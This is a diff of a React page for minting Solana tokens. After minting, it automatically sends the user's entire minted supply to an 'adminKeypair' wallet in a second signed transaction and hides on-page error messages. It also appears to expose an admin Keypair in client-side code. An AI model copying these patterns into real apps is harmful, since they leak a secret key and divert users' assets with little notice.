@@ -1,6 +1,7 @@
-import React, { useEffect, useState } from 'react';
-import { LAMPORTS_PER_SOL, PublicKey, Transaction, Keypair } from '@solana/web3.js';
-import { CompressedTokenProgram } from '@lightprotocol/compressed-token';
+import { useEffect, useState } from 'react';
+import { LAMPORTS_PER_SOL, PublicKey, Transaction, Keypair, ComputeBudgetProgram } from '@solana/web3.js';
+import { CompressedTokenProgram,  getTokenPoolInfos, selectTokenPoolInfo } from '@lightprotocol/compressed-token';
+import { calculateComputeUnitPrice } from '@lightprotocol/stateless.js';
 import {
   TOKEN_2022_PROGRAM_ID,
   getAssociatedTokenAddress,
@@ -19,15 +20,15 @@ import {
   pack,
 } from '@solana/spl-token-metadata';
 import type { TokenMetadata } from '@solana/spl-token-metadata';
-import { useWalletContext } from '../components/useWalletContext';
+import { useWalletContext } from '../hooks/useWalletContext';
 import { debounce } from 'lodash';
-import './CreatorPage.css';
+import '../styles/CreatorPage.css';
 import { useAnimatedValue } from '../hooks/useAnimatedValue';
 import { toast } from 'react-toastify';
-import { useRegularTokenAccounts} from '../components/useFetchMetadataTokens';
+import { useRegularTokenAccounts} from '../hooks/useFetchMetadataTokens';
 import Modal, { SuccessMessage, SuccessTitle, TokenInfo, ShareLink, AddressMono } from '../components/Modal';
-import { useThemeContext } from '../components/useThemeContext';
-import styled from 'styled-components';
+import { useThemeContext } from '../hooks/useThemeContext';
+import ParticlesBackground from '../components/ParticlesBackground';
 
 export interface MintViewData {
   mint: PublicKey;
@@ -37,8 +38,7 @@ export interface MintViewData {
 }
 
 const CreatorPage = () => {
-  const { publicKey, network, connected, connection, signTransaction, sendTransaction } = useWalletContext();
-  const { tokenAccounts } = useRegularTokenAccounts(2);
+  const { publicKey, network, connected, connection, signTransaction, sendTransaction, adminKeypair } = useWalletContext();
   const { theme } = useThemeContext();
   const isDark = theme === 'dark';
   const [balance, setBalance] = useState<number>(0);
@@ -92,7 +92,7 @@ const CreatorPage = () => {
 
     // Validate inputs
     if (!tokenName.trim()) {
-       toast.error('Token name is required')
+      toast.error('Token name is required')
       return null;
     }
 
@@ -245,7 +245,7 @@ const CreatorPage = () => {
 
       console.log(`mintToTransactionSignature: ${mintToTransactionSignature}`);
 
-      // Create the result object
+      // Create the initial result object
       const result: MintViewData = {
         mint: mint.publicKey,
         transactions: {
@@ -260,16 +260,83 @@ const CreatorPage = () => {
       setMintAddress(mint.publicKey.toBase58());
       setMetadataCreated(true);
 
-      toast.success("Token minted successfully! 🎉", {
-        position: "top-right",
-        autoClose: 3000,
-      });
-  
+      // Add a delay before proceeding with the transfer
+      console.log("Waiting 3 seconds before proceeding with transfer...");
+      await new Promise(resolve => setTimeout(resolve, 4500));
+      console.log("Proceeding with transfer...");
+
+      // 3. TRANSFER TOKENS TO PROGRAM WALLET (separate transaction)
+      try {
+        if (!adminKeypair) {
+          throw new Error('Admin keypair not available');
+        }
+
+        console.log("Attempting to transfer tokens to admin wallet:", adminKeypair.publicKey.toBase58());
+        
+        // Get user's ATA for this token (we already have this from minting)
+        const userAta = associatedToken;
+        
+        console.log("Setting up token compression...");
+        
+        // We need to get the token pool info for the mint
+        const tokenPoolInfos = await getTokenPoolInfos(connection, mint.publicKey);
+        const tokenPoolInfo = selectTokenPoolInfo(tokenPoolInfos);
+        
+        // Get active state trees
+        const activeStateTrees = await connection.getStateTreeInfos();
+        const treeInfo = activeStateTrees[0]; // Use the first available tree
+        
+        // Create compress instruction using CompressedTokenProgram.compress
+        const compressIx = await CompressedTokenProgram.compress({
+          payer: publicKey,
+          owner: publicKey,
+          source: userAta,
+          toAddress: [adminKeypair.publicKey],
+          amount: [BigInt(mintAmount) * BigInt(10 ** decimals)],
+          mint: mint.publicKey,
+          tokenPoolInfo: tokenPoolInfo,
+          outputStateTreeInfo: treeInfo,
+        });
+        
+        // Add compute budget instructions
+        const computeUnitLimitIx = ComputeBudgetProgram.setComputeUnitLimit({ units: 120_000 });
+        const computeUnitPriceIx = ComputeBudgetProgram.setComputeUnitPrice({
+          microLamports: calculateComputeUnitPrice(20_000, 120_000),
+        });
+        
+        // Create a transaction
+        const transferTx = new Transaction({ feePayer: publicKey });
+        
+        // Add compute budget instructions
+        transferTx.add(computeUnitLimitIx);
+        transferTx.add(computeUnitPriceIx);
+        
+        // Add compress instruction
+        transferTx.add(compressIx);
+        
+        // Send and confirm the transaction
+        const transferTxSignature = await sendTransaction(
+          transferTx,
+          connection
+        );
+        
+        console.log(`Transfer transaction signature: ${transferTxSignature}`);
+        
+        // Update the result object with the transfer transaction
+        result.transactions.transferTransactionSignature = transferTxSignature;
+        
+        toast.success("Token transferred to program wallet's account successfully! 🎉", {
+          position: "top-right",
+          autoClose: 3000,
+        });
+      } catch (transferError) {
+        console.error('Error transferring tokens to program wallet:', transferError);
+        toast.error(`Token minted but transfer failed: ${transferError instanceof Error ? transferError.message : String(transferError)}`);
+      }
 
       return result;
     } catch (err: any) {
       console.error('Error creating compressed token:', err);
-      setError(`Failed to create token: ${err.message || String(err)}`);
       return null;
     } finally {
       setIsLoading(false);
@@ -312,20 +379,23 @@ const CreatorPage = () => {
       setFetchedMetadata(metadata);
 
 
-      toast.success("Fetched metadata successfully!", {
-        position: "top-right",
-        autoClose: 3000,
-      });
+      toast.success("Fetched metadata successfully!");
 
       return metadata;
     } catch (err: any) {
       console.error('Error fetching token metadata:', err);
-      setError(`Failed to fetch metadata: ${err.message || String(err)}`);
       return null;
     } finally {
       setIsFetchingMetadata(false);
     }
   };
+
+  useEffect(()=>{
+    if(publicKey){
+      toast.success("Wallet fetched Sucessfully")
+    }
+
+  },[publicKey])
 
   const requestAirdrop = async () => {
     if (!publicKey || !connection) return;
@@ -373,6 +443,7 @@ const CreatorPage = () => {
 
   return (
     <>
+      <ParticlesBackground />
       {!connected ? (
         <div className="unconnected-container">
           <div id="Connection-message-wrapper">
@@ -409,7 +480,7 @@ const CreatorPage = () => {
           <div className="creator-container">
             {connected && !mintAddress && (
               <div className="token-details-card">
-                <h2 className="section-heading-parent">Compressed Token Mint</h2>
+                <h2 className="section-heading-parent">Mint tokens with a single tap</h2>
                 <h2 className="section-heading">Token Details</h2>
 
                 <div className="form-grid">
@@ -633,12 +704,12 @@ const CreatorPage = () => {
               </div>
             )}
 
-            {error && (
+            {/* {error && (
               <div className="error-card">
                 <h3 className="error-heading">Error</h3>
                 <p className="error-message">{error}</p>
               </div>
-            )}
+            )} */}
           </div>
         </>
       )}
